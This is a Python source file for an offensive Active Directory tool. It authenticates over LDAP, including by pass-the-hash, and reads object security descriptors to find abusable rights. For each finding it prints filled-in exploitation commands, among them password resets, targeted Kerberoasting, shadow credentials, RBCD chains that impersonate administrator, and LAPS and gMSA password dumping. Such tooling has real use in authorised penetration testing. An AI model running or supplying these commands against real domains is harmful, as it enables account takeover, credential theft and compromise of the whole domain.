from ldap3 import Server, ALL, Connection, NTLM, SUBTREE
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID, ACCESS_ALLOWED_OBJECT_ACE, ACCESS_ALLOWED_ACE
from uuid import UUID
from uuid import UUID
import argparse
from rich.console import Console
from rich.tree import Tree
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.theme import Theme
from rich.box import ROUNDED
from rich import box as rich_box

console = Console()

#https://learn.microsoft.com/en-us/windows/win32/secauthz/generic-access-rights
#https://www.0xczr.com/tools/ACL_cheatsheet/
#https://www.0xczr.com/tools/ACL_cheatsheet/#complete-acl-attack-matrix
GENERIC_ALL = 0x10000000
FULL_CONTROL_AD = 0x000f01ff
GENERIC_WRITE = 0x40000000
WRITE_OWNER = 0x00080000
WRITE_DACL = 0x00040000
CONTROL_ACCESS = 0x00000100
#DOMAIN_DN = 'DC=sansar,DC=local'
#victim_user = 'osman'
#target_user = 'irem' 

SPN_GUID = UUID("f3a64788-5306-11d1-a9c5-0000f80367c1")
User_Force_Change_Password = UUID("00299570-246d-11d0-a768-00aa006e0529")
DS_Replication_Get_Changes = UUID("1131f6aa-9c07-11d1-f79f-00c04fc2dcd2")
DS_Replication_Get_Changes_All = UUID("1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")
Self_Membership = UUID("bf9679c0-0de6-11d0-a285-00aa003049e2")
#GMSA_PASSWORD_GUID = UUID("3ed48e12-8273-11d2-8da6-0000f8759a0f")
GMSA_PASSWORD_GUID = UUID("e362ed86-b728-0842-b27d-2dea7a9df218")  # msDS-ManagedPassword
GMSA_PASSWORD_GUID_ALT = UUID("{e362ed86-b728-0842-b27d-2dea7a9df218}")
def infer_netbios(domain):
    return domain.split('.')[0].upper()

def domain_to_dn(domain):
    return ','.join(f'DC={x}' for x in domain.split('.'))

#def users_to_groups(conn, base_dn, username):
    #conn.search(base_dn, f'(sAMAccountName={username})', attributes=['memberOf'])
    #if not conn.entries:
        #return [] # it will give nothing inside of member
    #groups = []

    #if hasattr(conn.entries[0], 'memberOf'):
        #for group_dn in conn.entries[0].memberOf.values:
            #groups.append(str(group_dn))
    #return groups
def users_to_groups(conn, base_dn, username):
    search_filter = f"(&(objectClass=group)(member:1.2.840.113556.1.4.1941:={base_dn.replace('DC=', 'CN=' + username + ',CN=Users,')}))"

    conn.search(base_dn, f'(sAMAccountName={username})', attributes=['distinguishedName'])
    if not conn.entries:
        return []
    user_dn = conn.entries[0].distinguishedName.value

    conn.search(base_dn, f'(member:1.2.840.113556.1.4.1941:={user_dn})', attributes=['distinguishedName'])

    groups = [str(entry.distinguishedName) for entry in conn.entries]
    return groups

def get_groups_sids(conn, base_dn, group_dns):
    groups_sids = {}

    for group_dn in group_dns:
        try:
            conn.search(group_dn, '(objectClass=group)', attributes=['sAMAccountName', 'objectSid'], search_scope='BASE')

            if conn.entries and hasattr(conn.entries[0], 'objectSid'):
                sid_bytes = conn.entries[0].objectSid.raw_values[0]
                sid = LDAP_SID(sid_bytes).formatCanonical()
                group_name = str(conn.entries[0].sAMAccountName)
                groups_sids[sid] = group_name
        except Exception:
            continue
    
    return groups_sids

def decode_mask(mask):
    rights = []

    if (mask & 0xf01ff) == 0xf01ff or (mask & GENERIC_ALL):
        return ["Full Control / Generic All"]
    
    #if mask & GENERIC_WRITE:
        #rights.append("Generic Write")
    generic_write_mapped = 0x20028
    if (mask & GENERIC_WRITE) or ((mask & generic_write_mapped) == generic_write_mapped):
        rights.append("Generic Write")

    if mask & WRITE_DACL:
        rights.append("Write DACL (Modify Permissions)")
        
    if mask & WRITE_OWNER:
        rights.append("Write Owner (Take Ownership)")

    if mask & 0x00000100:
        rights.append("Extended Rights (Control Access)")

    #if mask & 0x00000010:
        #rights.append("Write Property")
    if mask & 0x00000020:
        rights.append("Write Property (e.g., Member Add/Remove)")

    # Standard GenericWrite check
    if (mask & GENERIC_WRITE) or (mask & 0x20028):
        rights.append("Generic Write")

    if mask & 0x00000001:
        rights.append("Create Child")

    return rights

def get_exploitation_hint(right, target, obj_type, domain, dc_ip, current_user, current_auth, dc_fqdn, target_fqdn):
    hints = []
    if right == "WriteSPN":
        #hints.append(("Kerberoasting (WriteSPN)", f"impacket-GetUserSPNs {domain}/{current_user} -request -dc-ip {dc_ip} -target-dn '{target}'"))
        hints.append(("Targeted Kerberoast", f"python3 targetedKerberoast.py -v -d '{domain}' -u '{current_user}' -p '{current_auth}' --dc-host {dc_fqdn if dc_fqdn else dc_ip}"))
    elif right == "User_Force_Change_Password":
        hints.append(("Force Change Password", f"impacket-net user {target} 'NewPassword123' -domain -dc-ip {dc_ip}"))
    elif right == "AddSelf (Self-Membership)" or right == "AddSelf(Self-Membership) - via SELF bit":
        hints.append(("Add Self to Group (impacket)", f"impacket-net group '{target}' {current_user} -add -domain -dc-ip {dc_ip}"))
        hints.append(("Add Self to Group (bloodyAD)", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth} add groupMember \"{target}\" {current_user}"))
    elif "Full Control" in right or "Generic All" in right:
        if obj_type == "user":
            hints.append(("Change Password (GenericAll)", f"bloodyAD --host {dc_ip} -d {domain} -u {current_user} -p {current_auth} set password {target} NewPassword123!"))
            hints.append(("Targeted Kerberoast", f"python3 targetedKerberoast.py -v -d '{domain}' -u '{current_user}' -p '{current_auth}'"))
            hints.append(("Shadow Credential Attack", f"certipy-ad shadow auto -u {current_user}@{domain} -p {current_auth} -target {target} -dc-ip {dc_ip}"))
        elif obj_type == "computer":
            hints.append(("Shadow Credentials", f"certipy-ad shadow auto -u {current_user}@{domain} -p {current_auth} -target {target} -dc-ip {dc_ip}"))
            hints.append(("RBCD Step 1: Add Computer", f"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018' -dc-host {dc_ip} -domain-netbios {domain} '{domain}/{current_user}:{current_auth}'"))
            hints.append(("RBCD Step 2: Write Delegation", f"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to '{target}' -action 'write' '{domain}/{current_user}:{current_auth}'"))
            hints.append(("RBCD Step 3: Get Service Ticket", f"getST.py -spn 'cifs/{target_fqdn}' -impersonate 'administrator' '{domain}/{current_user}:{current_auth}' -dc-ip {dc_ip}"))
            hints.append(("Note", f"If attacking the DC itself, use -spn 'cifs/{dc_fqdn}'"))
        elif obj_type == "group":
            hints.append(("Give genericall rights on group", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth} add genericAll {target} {current_user}"))
            hints.append(("Add group itself", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth} add groupMember {target} {current_user}"))
    elif "Generic Write" in right or "GenericWrite" in right:
        if obj_type == "user":
            hints.append(("Targeted Kerberoast", f"python3 targetedKerberoast.py -v -d '{domain}' -u '{current_user}' -p '{current_auth}'"))
            hints.append(("Shadow Credential Attack", f"certipy-ad shadow auto -u {current_user}@{domain} -p {current_auth} -target {target} -dc-ip {dc_ip}"))
        elif obj_type == "computer":
            hints.append(("Shadow Credentials", f"certipy-ad shadow auto -u {current_user}@{domain} -p {current_auth} -target {target} -dc-ip {dc_ip}"))
            hints.append(("RBCD Step 1: Add Computer", f"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM2$' -computer-pass 'Summer2019!' -dc-host {dc_fqdn} -domain-netbios {domain} '{domain}/{current_user}:{current_auth}'"))
            hints.append(("RBCD Step 2: Write Delegation", f"rbcd.py -delegate-from 'ATTACKERSYSTEM2$' -delegate-to '{target}' -action 'write' '{domain}/{current_user}:{current_auth}'"))
            hints.append(("RBCD Step 3: Get Service Ticket", f"getST.py -spn 'cifs/{target_fqdn}' -impersonate 'administrator' '{domain}/ATTACKERSYSTEM2$:Summer2019!'"))
        #elif obj_type == "group":
            #hints.append(("Add Member to Group (GenericWrite)", f"impacket-net group '{target}' {current_user} -add -domain -dc-ip {dc_ip}"))
    elif "ReadGmsaPassword" in right:
        #hints.append(("Read GMSA Password (Option A)", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth} get gmsaPassword {target}"))
        hints.append(("Read GMSA Password (Option B)", f"nxc ldap {dc_fqdn} -u {current_user} -p {current_auth} --gmsa"))
    elif "Extended Rights" in right:
        if obj_type == "user":
            hints.append(("Force Change Password (All Extended Rights)", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth} set password {target} NewPassword123!"))
        elif obj_type == "computer":
            hints.append(("Read LAPS Password (Option A)", f"nxc smb {target_fqdn if target_fqdn else target} -u {current_user} -p {current_auth} --laps"))
            hints.append(("Read LAPS Password (Option B)", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth} get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"))
    elif "Write DACL" in right or "WriteDACL" in right:
        if obj_type == "user":
            bloody_base = f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth}"
            hints.append(("Grant FullControl (Option A)", f"dacledit.py -action 'write' -rights 'FullControl' -principal '{current_user}' -target '{target}' '{domain}/{current_user}:{current_auth}'"))
            hints.append(("Grant GenericAll (Option B)", f"{bloody_base} add genericAll {target} {current_user}"))
            hints.append(("After granting rights", f"python3 targetedKerberoast.py -v -d '{domain}' -u '{current_user}' -p '{current_auth}'\n{bloody_base} set password {target} NewPassword123!\ncertipy-ad shadow auto -u {current_user}@{domain} -p {current_auth} -target {target} -dc-ip {dc_ip}"))
        elif obj_type == "computer":
            bloody_base = f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth}"
            hints.append(("Grant FullControl (Option A)", f"dacledit.py -action 'write' -rights 'FullControl' -principal '{current_user}' -target '{target}' '{domain}/{current_user}:{current_auth}'"))
            hints.append(("Grant GenericAll (Option B)", f"{bloody_base} add genericAll {target} {current_user}"))
            hints.append(("After granting rights", f"certipy-ad shadow auto -u {current_user}@{domain} -p {current_auth} -target {target} -dc-ip {dc_ip}\naddcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM5$' -computer-pass 'Summer2019!' -dc-host {dc_fqdn} -domain-netbios {domain} '{domain}/{current_user}:{current_auth}'\nrbcd.py -delegate-from 'ATTACKERSYSTEM5$' -delegate-to '{target}' -action 'write' '{domain}/{current_user}:{current_auth}'\ngetST.py -spn 'cifs/{target_fqdn}' -impersonate 'administrator' '{domain}/ATTACKERSYSTEM5$:Summer2019!'"))
        elif obj_type == "group":
            bloody_base = f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth}"
            hints.append(("Grant GenericAll", f"{bloody_base} add genericAll {target} {current_user}"))
            hints.append(("Add Member to Group", f"{bloody_base} add groupMember {target} {current_user}"))
    elif "Write Owner" in right or "WriteOwner" in right:
        if obj_type == "user":
            hints.append(("Take Ownership (Step 1)", f"owneredit.py -action write -new-owner {current_user} -target {target} '{domain}/{current_user}:{current_auth}'"))
            hints.append(("Grant FullControl (Step 2)", f"dacledit.py -action 'write' -rights 'FullControl' -principal '{current_user}' -target '{target}' '{domain}/{current_user}:{current_auth}'"))
            hints.append(("Reset Password (Step 3 - Option A)", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth} set password {target} NewStrongPassword123!"))
            hints.append(("Shadow Credentials (Step 3 - Option B)", f"certipy-ad shadow auto -u {current_user}@{domain} -p {current_auth} -target {target} -dc-ip {dc_ip}"))
            bloody_base = f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth}"
            hints.append(("bloodyAD-only path", f"{bloody_base} set owner {target} {current_user}\n{bloody_base} add genericAll {target} {current_user}\n{bloody_base} set password {target} NewStrongPassword123!"))
        elif obj_type == "computer":
            hints.append(("Take Ownership (Step 1)", f"owneredit.py -action write -new-owner {current_user} -target {target} '{domain}/{current_user}:{current_auth}'"))
            hints.append(("Grant FullControl (Step 2)", f"dacledit.py -action 'write' -rights 'FullControl' -principal '{current_user}' -target '{target}' '{domain}/{current_user}:{current_auth}'"))
            hints.append(("RBCD (Step 3)", f"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM3$' -computer-pass 'Summer2020!' -dc-host {dc_fqdn} -domain-netbios {domain} '{domain}/{current_user}:{current_auth}'\nrbcd.py -delegate-from 'ATTACKERSYSTEM3$' -delegate-to '{target}' -action 'write' '{domain}/{current_user}:{current_auth}'\ngetST.py -spn 'cifs/{target_fqdn}' -impersonate 'administrator' '{domain}/ATTACKERSYSTEM3$:Summer2020!'"))
            bloody_base = f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth}"
            hints.append(("bloodyAD path", f"{bloody_base} set owner {target} {current_user}\n{bloody_base} add genericAll {target} {current_user}\n# If successful, proceed with RBCD escalation (Step 3 above)"))
        else:
            hints.append(("Take Ownership", f"owneredit.py -action write -new-owner {current_user} -target {target} '{domain}/{current_user}:{current_auth}'"))

    return hints
def main():
    parser = argparse.ArgumentParser(description='Enum ACL')
    parser.add_argument('-u', '--username', required=True, help='Username of victim')
    parser.add_argument('-p', '--password', help='Password of victim')
    parser.add_argument('-d', '--domain', required=True, help='domain')
    parser.add_argument('-dc-ip', '--dc-ip', required=True, help='domain')
    parser.add_argument('-dc-fqdn', '--dc-fqdn', help='DC FQDN (helpful for Kerberos)')
    parser.add_argument('-H', '--hash', help='NTLM hash (for PTH)')

    args = parser.parse_args()
    netbios = infer_netbios(args.domain)
    base_dn = domain_to_dn(args.domain)

    server = Server(args.dc_ip, get_info=ALL)
    try:
        if args.hash:
            lm = "aad3b435b51404eeaad3b435b51404ee"
            nt = args.hash
            conn = Connection(server, user=f"{netbios}\\{args.username}", password=f"{lm}:{nt}", authentication=NTLM, auto_bind=True)
        else:
            conn = Connection(server, user=f"{netbios}\\{args.username}", password=args.password, authentication=NTLM, auto_bind=True)
        #conn.search(DOMAIN_DN, f'(sAMAccountName={victim_user})', attributes=['objectSid'])
    except Exception as e:
        print(f"[-] Auth failed!: {e}")
        return
    console.print(f"[bold green][+] Connection Success![/bold green]")

    dc_fqdn = args.dc_fqdn
    if not dc_fqdn and server.info:
        for attr in ['dnsHostName', 'dNSHostName']:
            if attr in server.info.other:
                val = server.info.other[attr]
                dc_fqdn = str(val[0]) if isinstance(val, (list, tuple)) else str(val)
                break
    if not dc_fqdn:
        dc_fqdn = args.dc_ip

    conn.search(base_dn, f'(sAMAccountName={args.username})', attributes=['objectSid'])

    if not conn.entries:
        console.print(f"[bold red][-] Could not find: {args.username}[/bold red]")
        return

    victim_sid = LDAP_SID(conn.entries[0].objectSid.raw_values[0]).formatCanonical()

    victim_groups = users_to_groups(conn, base_dn, args.username)
    groups_sids = get_groups_sids(conn, base_dn, victim_groups)

    group_tree = Tree(f"[bold blue]Groups for {args.username}[/bold blue]", guide_style="bold bright_black")
    for sid, name in groups_sids.items():
        group_tree.add(f"[cyan]{name}[/cyan] [dim]({sid})[/dim]")
    console.print(group_tree)
    console.print("")

    #if groups_sids:
        #for sid, name in groups_sids.items():
            #print(f"-{name} ({sids})")

    all_victim_sids = {victim_sid: f"{args.username} (direct)"}
    #all_victim_sids.append(groups_sids)

    for sid, name in groups_sids.items():
        all_victim_sids[sid] = f"{name} (group)"
    #user_filter = '(&(objectClass=person)(objectClass=user))'
    controls = [('1.2.840.113556.1.4.801', True, b'\x30\x03\x02\x01\x07')]
    principal_filter = '(|(objectClass=user)(objectClass=group)(objectClass=computer)(objectClass=msDS-GroupManagedServiceAccount)(objectClass=organizationalUnit))'
    #principal_filter = '(|(objectClass=user)(objectClass=group)(objectClass=computer)(objectClass=msDS-GroupManagedServiceAccount))'
    #principal_filter = '(|(objectClass=user)(objectClass=group)(objectClass=computer))'
    #principal_filter = '(|(objectClass=user)(objectClass=group)(objectClass=computer)(objectClass=msDS-GroupManagedServiceAccount))'
    conn.search(base_dn, principal_filter, attributes=['sAMAccountName', 'nTSecurityDescriptor', 'objectClass', 'dNSHostName', 'msDS-GroupMSAMembership'], controls=controls)
    #if not conn.entries:
        #print(f"[-] Could not find: {target_user}")
        #exit()
   # print("\n[DEBUG] Checking for GMSA accounts.....")
    #for entry in conn.entries:
        #if hasattr(entry, 'objectClass'):
            #obj_classes = entry.objectClass.values
            #if "msDS-GroupManagedServiceAccount" in obj_classes:
                #print(f"Found GMSA: {entry.sAMAccountName}")
    #print("[DEBUG] Done checking GMSAs\n")
    found = False # never delete this!!!!!!!!!!!!!!!!

    for entry in conn.entries:
        if not entry.sAMAccountName:
            continue
        target_name = str(entry.sAMAccountName)
        if target_name.lower() == args.username.lower():
            continue
            
        entry_found = False

        obj_classes = entry.objectClass.values if hasattr(entry, 'objectClass') else []
        obj_type = "user"
        if "msDS-GroupManagedServiceAccount" in obj_classes:
            obj_type = "gmsa"
        elif "computer" in obj_classes:
            obj_type = "computer"
        elif "group" in obj_classes:
            obj_type = "group"
        elif "organizationalUnit" in obj_classes:
            obj_type = "ou"
        
        target_fqdn = str(entry.dNSHostName) if hasattr(entry, 'dNSHostName') else target_name
        if target_fqdn.endswith('$'):
            target_fqdn = target_fqdn[:-1] + "." + args.domain



        # Create a tree for this user
        user_tree = Tree(f"[bold blue]{args.username}[/bold blue] -> [bold red]{target_name}[/bold red] ([yellow]{obj_type}[/yellow])", guide_style="bold bright_black")

        # GMSA msDS-GroupMSAMembership check
        if obj_type == "gmsa" and 'msDS-GroupMSAMembership' in entry:
            try:
                gmsa_sd = SR_SECURITY_DESCRIPTOR(data=entry['msDS-GroupMSAMembership'].raw_values[0])
                for gmsa_ace in gmsa_sd['Dacl'].aces:
                    gmsa_trustee_sid = gmsa_ace['Ace']['Sid'].formatCanonical()
                    if gmsa_trustee_sid in all_victim_sids:
                        src = "DIRECT" if gmsa_trustee_sid == victim_sid else "VIA GROUP"
                        via = all_victim_sids[gmsa_trustee_sid]
                        
                        # Create rights table
                        rights_table = Table(box=ROUNDED, show_header=False, show_edge=False, pad_edge=False)
                        rights_table.add_column("Property", style="bold cyan")
                        rights_table.add_column("Value", style="white")
                        
                        rights_table.add_row("Rights", "ReadGmsaPassword (via msDS-GroupMSAMembership)")
                        rights_table.add_row("Mask", hex(gmsa_ace['Ace']['Mask']['Mask']))
                        rights_table.add_row("Via", f"{via} ({src})")
                        
                        ace_node = user_tree.add(Panel(rights_table, title=f"[bold green]GMSA Rights[/bold green]", border_style="green"))

                        auth_val = args.hash if args.hash else args.password
                        hints = get_exploitation_hint("ReadGmsaPassword", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn)
                        
                        
                        if hints:
                            exploit_panel = Table(box=rich_box.MINIMAL, show_header=False, pad_edge=False)
                            for name, cmd in hints:
                                exploit_panel.add_row(f"[bold red][!][/bold red] [bold white]{name}[/bold white]")
                                exploit_panel.add_row(f"      [dim]{cmd}[/dim]")
                                exploit_panel.add_row("") 
                            ace_node.add(Panel(exploit_panel, title="[bold red]Exploitation Hints[/bold red]", border_style="red"))
                        
                        entry_found = True
            except Exception:
                pass

        if 'nTSecurityDescriptor' not in entry:
            continue


        if 'nTSecurityDescriptor' in entry:
            try:
                sd = SR_SECURITY_DESCRIPTOR(data=entry.nTSecurityDescriptor.raw_values[0])
                if sd['Dacl']:
                    for ace in sd['Dacl'].aces:
                        try:
                            trustee_sid = ace['Ace']['Sid'].formatCanonical()
                            mask = ace['Ace']['Mask']['Mask']
                        except:
                            continue

                        if trustee_sid in all_victim_sids:
                            ace_found = False
                            rights = []
                            
                            # Standard rights checks
                            if (mask & GENERIC_ALL) == GENERIC_ALL or (mask & FULL_CONTROL_AD) == FULL_CONTROL_AD:
                                rights.append("Full Control / Generic All")
                            if (mask & GENERIC_WRITE) == GENERIC_WRITE:
                                rights.append("Generic Write")
                            if mask & 0x00000020:
                                rights.append("Write Property (e.g., Member Add/Remove)")
                            
                            generic_write_mapped = 0x20028
                            if (mask & GENERIC_WRITE) or ((mask & generic_write_mapped) == generic_write_mapped):
                                if "Generic Write" not in rights:
                                    rights.append("Generic Write")

                            if mask & WRITE_DACL:
                                rights.append("Write DACL (Modify Permissions)")
                                
                            if mask & WRITE_OWNER:
                                rights.append("Write Owner (Take Ownership)")

                            if mask & 0x00000100:
                                rights.append("Extended Rights (Control Access)")

                            if ace['AceType'] == ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE and (ace['Ace']['Flags'] & ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT):
                                try:
                                    obj_guid = UUID(bytes_le=ace['Ace']['ObjectType'])
                                    if obj_guid == User_Force_Change_Password:
                                        rights.append("User_Force_Change_Password")
                                    elif obj_guid == Self_Membership:
                                        rights.append("AddSelf (Self-Membership) - via SELF bit")
                                except:
                                    pass

                            if rights:
                                src = "DIRECT" if trustee_sid == victim_sid else "VIA GROUP"
                                via = all_victim_sids[trustee_sid]
                                
                                # Create rights table
                                rights_table = Table(box=ROUNDED, show_header=False, show_edge=False, pad_edge=False)
                                rights_table.add_column("Property", style="bold cyan")
                                rights_table.add_column("Value", style="white")
                                
                                rights_table.add_row("Rights", ", ".join(rights))
                                rights_table.add_row("Mask", hex(mask))
                                rights_table.add_row("Via", f"{via} ({src})")
                                
                                ace_node = user_tree.add(Panel(rights_table, title=f"[bold green]ACE Found[/bold green]", border_style="green"))
                                
                                unique_hints = {}
                                for right in rights:
                                    hints = get_exploitation_hint(right, target_name, obj_type, args.domain, args.dc_ip, args.username, args.hash if args.hash else args.password, dc_fqdn, target_fqdn)
                                    if hints:
                                        for name, cmd in hints:
                                            unique_hints[(name, cmd)] = None

                                if unique_hints:
                                    exploit_panel = Table(box=rich_box.MINIMAL, show_header=False, pad_edge=False)
                                    for name, cmd in unique_hints:
                                        exploit_panel.add_row(f"[bold red][!][/bold red] [bold white]{name}[/bold white]")
                                        for line in cmd.splitlines():
                                            exploit_panel.add_row(f"      [dim]{line.strip()}[/dim]")
                                        exploit_panel.add_row("") 
                                    ace_node.add(Panel(exploit_panel, title="[bold red]Exploitation Hints[/bold red]", border_style="red"))
                                
                                entry_found = True
                                ace_found = True


                #WriteSPN detection
                            if ace['AceType'] in [ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE]:
                                # Using ACE_OBJECT_TYPE_PRESENT instead of ADS_FLAG_OBJECT_TYPE_PRESENT
                                if ace['Ace']['Flags'] & ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT:
                                    try:
                                        obj_guid = UUID(bytes_le=ace['Ace']['ObjectType'])
                                        if obj_guid == SPN_GUID:
                                            src = "DIRECT" if trustee_sid == victim_sid else "VIA GROUP"
                                            via = all_victim_sids[trustee_sid]
                                            
                                            rights_table = Table(box=ROUNDED, show_header=False, show_edge=False, pad_edge=False)
                                            rights_table.add_column("Property", style="bold cyan")
                                            rights_table.add_column("Value", style="white")
                                            
                                            rights_table.add_row("Rights", "WriteSPN")
                                            rights_table.add_row("Mask", hex(mask))
                                            rights_table.add_row("Via", f"{via} ({src})")
                                            
                                            ace_node = user_tree.add(Panel(rights_table, title=f"[bold green]ACE Found[/bold green]", border_style="green"))
                
                                            auth_val = args.hash if args.hash else args.password
                                            hints = get_exploitation_hint("WriteSPN", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn)
                                            
                                            if hints:
                                                exploit_panel = Table(box=rich_box.MINIMAL, show_header=False, pad_edge=False)
                                                for name, cmd in hints:
                                                    exploit_panel.add_row(f"[bold red][!][/bold red] [bold white]{name}[/bold white]")
                                                    exploit_panel.add_row(f"      [dim]{cmd}[/dim]")
                                                    exploit_panel.add_row("") 
                                                ace_node.add(Panel(exploit_panel, title="[bold red]Exploitation Hints[/bold red]", border_style="red"))
                                            
                                            entry_found = True
                                            ace_found = True
                                    except Exception:
                                        pass
                            #WriteSPN detection end
                            #forcechangepassword detection
                            if ace['AceType'] in [ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE]:
                                if ace['Ace']['Flags'] & ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT:
                                    try:
                                        obj_guid = UUID(bytes_le=ace['Ace']['ObjectType'])
                                        if obj_guid == User_Force_Change_Password:
                                            src = "DIRECT" if trustee_sid == victim_sid else "VIA GROUP"
                                            via = all_victim_sids[trustee_sid]
                                            
                                            rights_table = Table(box=ROUNDED, show_header=False, show_edge=False, pad_edge=False)
                                            rights_table.add_column("Property", style="bold cyan")
                                            rights_table.add_column("Value", style="white")
                                            
                                            rights_table.add_row("Rights", "User_Force_Change_Password")
                                            rights_table.add_row("Mask", hex(mask))
                                            rights_table.add_row("Via", f"{via} ({src})")
                                            
                                            ace_node = user_tree.add(Panel(rights_table, title=f"[bold green]ACE Found[/bold green]", border_style="green"))
                
                                            auth_val = args.hash if args.hash else args.password
                                            hints = get_exploitation_hint("User_Force_Change_Password", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn)
                                            
                                            if hints:
                                                exploit_panel = Table(box=rich_box.MINIMAL, show_header=False, pad_edge=False)
                                                for name, cmd in hints:
                                                    exploit_panel.add_row(f"[bold red][!][/bold red] [bold white]{name}[/bold white]")
                                                    exploit_panel.add_row(f"      [dim]{cmd}[/dim]")
                                                    exploit_panel.add_row("") 
                                                ace_node.add(Panel(exploit_panel, title="[bold red]Exploitation Hints[/bold red]", border_style="red"))
                                            
                                            entry_found = True
                                            ace_found = True
                                    except Exception:
                                        pass
                            # Addself detection
                            if ace['AceType'] in [ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE]:
                                if ace['Ace']['Flags'] & ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT:
                                    try:
                                        obj_guid = UUID(bytes_le=ace['Ace']['ObjectType'])
                                        if obj_guid == Self_Membership:
                                            src = "DIRECT" if trustee_sid == victim_sid else "VIA GROUP"
                                            via = all_victim_sids[trustee_sid]
                                            
                                            rights_table = Table(box=ROUNDED, show_header=False, show_edge=False, pad_edge=False)
                                            rights_table.add_column("Property", style="bold cyan")
                                            rights_table.add_column("Value", style="white")
                                            
                                            rights_table.add_row("Rights", "AddSelf (Self-Membership)")
                                            rights_table.add_row("Mask", hex(mask))
                                            rights_table.add_row("Via", f"{via} ({src})")
                                            
                                            ace_node = user_tree.add(Panel(rights_table, title=f"[bold green]ACE Found[/bold green]", border_style="green"))
                
                                            auth_val = args.hash if args.hash else args.password
                                            hints = get_exploitation_hint("AddSelf (Self-Membership)", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn)
                                            
                                            if hints:
                                                exploit_panel = Table(box=rich_box.MINIMAL, show_header=False, pad_edge=False)
                                                for name, cmd in hints:
                                                    exploit_panel.add_row(f"[bold red][!][/bold red] [bold white]{name}[/bold white]")
                                                    exploit_panel.add_row(f"      [dim]{cmd}[/dim]")
                                                    exploit_panel.add_row("") 
                                                ace_node.add(Panel(exploit_panel, title="[bold red]Exploitation Hints[/bold red]", border_style="red"))
                                            
                                            entry_found = True
                                            ace_found = True
                                    except Exception:
                                        pass
                            # specialized AddSelf bit check removed and merged into generic logic below to avoid mutual exclusivity
                            # GMSA
                            #if not ace_found and obj_type == "gmsa":
                            #if not ace_found and ace['AceType'] == ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE:
                                #if ace['AceType'] == ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE:
                                    #if ace['Ace']['Flags'] & ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT:
                                        #try:
                                            #obj_guid = UUID(bytes_le=ace['Ace']['ObjectType'])
                                    #print("-" * 20)
                
                                    #found = True
                                    #continue
                            #if ace['AceType'] == 
                            if not ace_found:
                                rights = list(dict.fromkeys(decode_mask(mask))) # Deduplicate while preserving order
                                if obj_type == "group" and (mask & 0x00000008):
                                    if "AddSelf(Self-Membership) - via SELF bit" not in rights:
                                        rights.append("AddSelf(Self-Membership) - via SELF bit")
                                if rights:
                                    src = "DIRECT" if trustee_sid == victim_sid else "VIA GROUP"
                                    via = all_victim_sids[trustee_sid]
                
                                    # Create rights table
                                    rights_table = Table(box=ROUNDED, show_header=False, show_edge=False, pad_edge=False)
                                    rights_table.add_column("Property", style="bold cyan")
                                    rights_table.add_column("Value", style="white")
                                    
                                    rights_table.add_row("Rights", ", ".join(rights))
                                    rights_table.add_row("Mask", hex(mask))
                                    rights_table.add_row("Via", f"{via} ({src})")
                                    
                                    ace_node = user_tree.add(Panel(rights_table, title=f"[bold green]ACE Found[/bold green]", border_style="green"))
                
                                    auth_val = args.hash if args.hash else args.password
                                    unique_hints = {}
                                    for r in rights:
                                        hints = get_exploitation_hint(r, target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn)
                                        if hints:
                                            for name, cmd in hints:
                                                unique_hints[(name, cmd)] = None
                
                                    if unique_hints:
                                        exploit_panel = Table(box=rich_box.MINIMAL, show_header=False, pad_edge=False)
                                        for name, cmd in unique_hints:
                                            exploit_panel.add_row(f"[bold red][!][/bold red] [bold white]{name}[/bold white]")
                                            for line in cmd.splitlines():
                                                exploit_panel.add_row(f"      [dim]{line.strip()}[/dim]")
                                            exploit_panel.add_row("") 
                                        ace_node.add(Panel(exploit_panel, title="[bold red]Exploitation Hints[/bold red]", border_style="red"))
                
                                    entry_found = True
                                    ace_found = True
            except Exception:
                pass
        
        if entry_found:
            console.print(user_tree)
            console.print("")
            found = True
        #except Exception:
            #continue
    if not found:
        console.print(f"[bold red][-] No interesting ACL found[/bold red]")
                    #if (mask & GENERIC_ALL) or (mask & FULL_CONTROL_AD):
